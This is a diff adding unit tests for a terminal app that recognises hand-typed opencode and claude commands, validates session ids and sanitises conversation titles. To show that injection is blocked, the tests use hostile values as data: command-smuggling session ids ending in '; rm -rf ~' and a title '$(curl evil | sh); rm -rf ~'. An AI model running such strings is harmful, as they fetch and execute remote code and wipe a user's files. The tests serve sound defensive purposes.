@@ -12,9 +12,15 @@
 import { describe, test, assert } from '../e2e/harness/testFramework.js';
 import {
   AGENT_IDS,
+  agentFromCommandLine,
   agentLabel,
+  cleanAgentTitle,
   isKnownAgent,
+  isSessionIdFor,
   newSessionId,
+  opencodeTitleMatches,
+  opencodeTitleOf,
+  pickOpencodeSession,
   resumeCertainty,
   resumeCommand,
   serializeAgent,
@@ -86,7 +92,9 @@ describe('Agent sessions: starting one, and starting it again', () => {
     const { agent } = startCommand('claude');
     const stored = serializeAgent({ ...agent, extra: 'dropped', sessionId: agent.sessionId });
 
-    assert.deepEqual(Object.keys(stored).sort(), ['kind', 'sessionId', 'startedAt']);
+    // `title`: the conversation's name, which opencode shows and the offer
+    // repeats — text only, never typed (see AG-20).
+    assert.deepEqual(Object.keys(stored).sort(), ['kind', 'sessionId', 'startedAt', 'title']);
     assert.equal(resumeCommand(stored), `claude --resume ${agent.sessionId}`);
     // A field of the wrong type is not carried into a command line.
     assert.equal(serializeAgent({ kind: 'claude', sessionId: { evil: true } }).sessionId, null);
@@ -241,5 +249,168 @@ describe('Resuming waits for the prompt', () => {
     } finally {
       await T.getState().closeTab(tab.id);
     }
+  });
+});
+
+describe('An agent typed by hand at the prompt', () => {
+  const UUID = 'd4bef4d0-c043-40ef-b157-640fb31ac0ea';
+  const SES = 'ses_ef45006f5ffeAMtumN5ySj4VmT';
+
+  test('AG-13: the plain ways to start one are recognised, with the conversation when the line names it', () => {
+    const cases = [
+      ['opencode', { kind: 'opencode', sessionId: null }],
+      ['  opencode  ', { kind: 'opencode', sessionId: null }],
+      ['opencode -c', { kind: 'opencode', sessionId: null }],
+      ['opencode --continue --model anthropic/claude-sonnet-5', { kind: 'opencode', sessionId: null }],
+      ['opencode --model=openai/gpt-5 -c', { kind: 'opencode', sessionId: null }],
+      ['opencode --prompt "fix the build" --agent plan', { kind: 'opencode', sessionId: null }],
+      ['OPENCODE_DISABLE_AUTOUPDATE=1 opencode', { kind: 'opencode', sessionId: null }],
+      ['opencode.exe', { kind: 'opencode', sessionId: null }],
+      ['OpenCode.cmd -c', { kind: 'opencode', sessionId: null }],
+      [`opencode -s ${SES}`, { kind: 'opencode', sessionId: SES }],
+      [`opencode --session ${SES} -m x/y`, { kind: 'opencode', sessionId: SES }],
+      [`opencode --session=${SES}`, { kind: 'opencode', sessionId: SES }],
+      [`opencode -s ${SES} --fork`, { kind: 'opencode', sessionId: null }],
+      ['opencode -s "x; rm -rf ~"', { kind: 'opencode', sessionId: null }],
+      ['claude', { kind: 'claude', sessionId: null }],
+      ['claude "why does the build fail?"', { kind: 'claude', sessionId: null }],
+      ['claude -c', { kind: 'claude', sessionId: null }],
+      ['claude --resume', { kind: 'claude', sessionId: null }],
+      [`claude --resume ${UUID}`, { kind: 'claude', sessionId: UUID }],
+      [`claude -r ${UUID} --model opus`, { kind: 'claude', sessionId: UUID }],
+      [`claude --resume=${UUID}`, { kind: 'claude', sessionId: UUID }],
+      [`claude --session-id ${UUID}`, { kind: 'claude', sessionId: UUID }],
+      [`claude --resume ${UUID} --fork-session`, { kind: 'claude', sessionId: null }],
+      ['claude --dangerously-skip-permissions', { kind: 'claude', sessionId: null }],
+    ];
+    for (const [line, want] of cases) {
+      assert.deepEqual(agentFromCommandLine(line), want, JSON.stringify(line));
+    }
+  });
+
+  test('AG-14: a subcommand, a one-off, a compound line, a path or another program is not an agent here', () => {
+    const lines = [
+      // not the conversation view
+      'opencode run "hi"', 'opencode session list', 'opencode serve', 'opencode web', 'opencode pr 12',
+      'opencode ../other-project', 'opencode -- -c', 'opencode --help', 'opencode -v', 'opencode --version',
+      'claude -p "hi"', 'claude --print hi', 'claude mcp list', 'claude update', 'claude doctor',
+      'claude --bg "do it"', 'claude --version', 'claude agents', 'claude stop 3',
+      // more than one command, or a program chosen at run time
+      'cd x && opencode', 'opencode; ls', 'opencode | tee log', 'opencode > out.txt', 'opencode &',
+      'echo $(opencode)', 'opencode `pwd`', 'opencode -m "$MODEL"', '(opencode)', 'opencode "unterminated',
+      // claude takes a prompt as a positional, so for it nothing but the
+      // separators themselves can tell a pipe or a redirection from a prompt
+      'claude | tee log', 'claude && ls', 'claude > out.txt', 'claude; opencode', 'claude &',
+      'claude "$(cat prompt.txt)"', 'claude `cat prompt.txt`', 'claude < prompt.txt',
+      // a path to it: the resume would type the bare name
+      './opencode', '/usr/local/bin/opencode', 'C:\\tools\\opencode.exe', '~/bin/claude',
+      // other programs
+      'opencoder', 'claude-code', 'vim opencode', 'npx opencode', 'git commit -m opencode', '', '   ',
+    ];
+    for (const line of lines) assert.equal(agentFromCommandLine(line), null, JSON.stringify(line));
+    for (const bad of [null, undefined, 42, {}, 'opencode '.repeat(1000)]) {
+      assert.equal(agentFromCommandLine(bad), null, `${typeof bad}`);
+    }
+  });
+
+  test('AG-15: an opencode conversation id resumes exactly; one that is not opencode\'s shape never reaches the shell', () => {
+    const agent = { kind: 'opencode', sessionId: SES, startedAt: 1 };
+    assert.equal(resumeCommand(agent), `opencode -s ${SES}`);
+    assert.equal(resumeCertainty(agent), 'exact');
+    assert.equal(serializeAgent(agent).sessionId, SES);
+    const hostile = [
+      `${SES}; rm -rf ~`, `${SES} --auto`, `$(${SES})`, 'ses_', 'ses_short', 'SES_ef45006f5ffeAMtumN5ySj4VmT',
+      'ses_ef45006f5ffe-AMtumN5ySj4VmT', ` ${SES}`, `${SES}\n`, UUID, '--auto', `ses_${'a'.repeat(65)}`,
+    ];
+    for (const sessionId of hostile) {
+      const raw = { kind: 'opencode', sessionId, startedAt: 1 };
+      assert.equal(resumeCommand(raw), 'opencode --continue', JSON.stringify(sessionId));
+      assert.equal(resumeCertainty(raw), 'latest');
+      assert.equal(serializeAgent(raw).sessionId, null);
+      assert.equal(isSessionIdFor('opencode', sessionId), false);
+    }
+    // Each agent's ids are its own: a claude UUID is not an opencode id, nor the other way round.
+    assert.equal(resumeCommand({ kind: 'claude', sessionId: SES }), 'claude --continue');
+    assert.equal(isSessionIdFor('claude', UUID), true);
+    assert.equal(isSessionIdFor('nope', UUID), false);
+  });
+
+  test('AG-16: the title opencode gives the terminal names the conversation; its other titles name none', () => {
+    assert.equal(opencodeTitleOf('OC | Fix the login bug'), 'Fix the login bug');
+    assert.equal(opencodeTitleOf('OC | 한글 제목 | with bars'), '한글 제목 | with bars');
+    for (const other of ['OpenCode', '', 'OC |', 'OC | ', 'oc | lower', 'vim — main.rs', 'OC|tight', null, 7]) {
+      assert.equal(opencodeTitleOf(other), null, JSON.stringify(other));
+    }
+  });
+
+  test('AG-17: a title fits the conversation opencode would show it for — cut at 37 past 40, even through an emoji', () => {
+    // opencode 1.18.34's own rule (its TUI source): `title.length > 40 ? title.slice(0, 37) + "…" : title`,
+    // then out through the terminal as UTF-8, where half an emoji becomes U+FFFD.
+    const shownBy = (title) => {
+      const shown = title.length > 40 ? `${title.slice(0, 37)}\u2026` : title;
+      return Buffer.from(shown, 'utf8').toString('utf8');
+    };
+    const titles = [
+      'Hello from the mock.',
+      'x'.repeat(40),
+      'x'.repeat(41),
+      'Refactor the PTY output bus so hidden tabs keep their history',
+      `${'a'.repeat(36)}🚀 then more words after the rocket`,
+      `${'a'.repeat(35)}🚀 then more words after the rocket`,
+      '한글로 된 꽤 긴 대화 제목이 사십 글자를 넘어가면 어떻게 잘리는지 확인하는 제목',
+    ];
+    let seed = 7;
+    const rand = (n) => (seed = (seed * 1103515245 + 12345) % 2147483648) % n;
+    const alphabet = ['a', 'Z', ' ', '-', '한', '🚀', '…', 'é', '|'];
+    for (let i = 0; i < 300; i += 1) {
+      titles.push(Array.from({ length: 1 + rand(60) }, () => alphabet[rand(alphabet.length)]).join(''));
+    }
+    for (const title of titles) {
+      assert.equal(opencodeTitleMatches(shownBy(title), title), true, `${JSON.stringify(title)} as ${JSON.stringify(shownBy(title))}`);
+    }
+    // And not what it would not show.
+    assert.equal(opencodeTitleMatches('Hello from the mock', 'Hello from the mock.'), false);
+    assert.equal(opencodeTitleMatches(`${'x'.repeat(37)}\u2026`, 'x'.repeat(40)), false, 'a 40-character title is shown whole');
+    assert.equal(opencodeTitleMatches(`${'y'.repeat(37)}\u2026`, 'x'.repeat(50)), false);
+    assert.equal(opencodeTitleMatches(`${'x'.repeat(30)}\u2026`, 'x'.repeat(50)), false, 'cut anywhere but at 37 is not opencode\'s');
+    assert.equal(opencodeTitleMatches(null, 'x'), false);
+  });
+
+  test('AG-18: among conversations the title fits, the one already known stays, otherwise the newest', () => {
+    const OLD = 'ses_aaaaaaaaaaaaOLDOLDOLDOLDOL';
+    const NEW = 'ses_bbbbbbbbbbbbNEWNEWNEWNEWN';
+    const OTHER = 'ses_ccccccccccccOTHEROTHEROTH';
+    const sessions = [
+      { id: OLD, title: 'Hello from the mock.', updated: 100 },
+      { id: NEW, title: 'Hello from the mock.', updated: 300 },
+      { id: OTHER, title: 'Something else', updated: 500 },
+      { id: 'not an id', title: 'Hello from the mock.', updated: 900 },
+    ];
+    assert.equal(pickOpencodeSession(sessions, { title: 'Hello from the mock.' }).id, NEW);
+    assert.equal(
+      pickOpencodeSession(sessions, { title: 'Hello from the mock.', currentId: OLD }).id,
+      OLD,
+      'opened with -s: an older conversation is not made the newest by being opened (measured)'
+    );
+    assert.equal(pickOpencodeSession(sessions, { title: 'Hello from the mock.', currentId: OTHER }).id, NEW, 'a known id whose title no longer fits is left');
+    assert.equal(pickOpencodeSession(sessions, { title: 'Nothing like it' }), null);
+    const long = 'Refactor the PTY output bus so hidden tabs keep their history';
+    assert.equal(
+      pickOpencodeSession([{ id: NEW, title: long, updated: 1 }], { title: `${long.slice(0, 37)}\u2026` }).id,
+      NEW
+    );
+    for (const bad of [null, undefined, 'x', [null, 7]]) assert.equal(pickOpencodeSession(bad, { title: 'x' }), null);
+    assert.equal(pickOpencodeSession(sessions, { title: '' }), null);
+  });
+
+  test('AG-19: a title is kept as one line of plain text, and never becomes part of a command', () => {
+    assert.equal(cleanAgentTitle('  Fix   the\tlogin\nbug  '), 'Fix the login bug');
+    assert.equal(cleanAgentTitle('evil\u202eetirw\u0007\u009b31m'), 'evil etirw 31m');
+    assert.equal(cleanAgentTitle('x'.repeat(500)).length, 200);
+    for (const bad of [null, undefined, 7, {}, '', '   ', '\u0007']) assert.equal(cleanAgentTitle(bad), null);
+    const stored = serializeAgent({ kind: 'opencode', sessionId: SES, startedAt: 1, title: '$(curl evil | sh); rm -rf ~' });
+    assert.equal(stored.title, '$(curl evil | sh); rm -rf ~', 'kept as the text it is…');
+    assert.equal(resumeCommand(stored), `opencode -s ${SES}`, '…and typed nowhere');
+    assert.equal(serializeAgent({ kind: 'opencode', title: { toString: () => 'x' } }).title, null);
   });
 });
